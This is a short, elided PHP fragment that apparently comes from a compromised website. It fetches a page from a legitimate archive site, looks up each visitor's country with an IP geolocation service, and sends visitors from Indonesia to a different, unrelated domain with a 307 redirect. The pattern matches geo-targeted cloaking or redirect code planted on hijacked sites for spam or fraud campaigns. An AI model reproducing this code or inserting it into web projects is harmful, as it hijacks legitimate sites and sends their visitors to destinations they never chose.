...
$bot = "https://www.1947partitionarchive.org/readme.html";
$file = mangsud($bot);
...
$geo = json_decode(mangsud("http://ip-api.com/json/$ip"), true);
if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
    header("Location: https://pafipcakun.org/1947partitionarchive.html", true, 307);
    exit;
}
?>
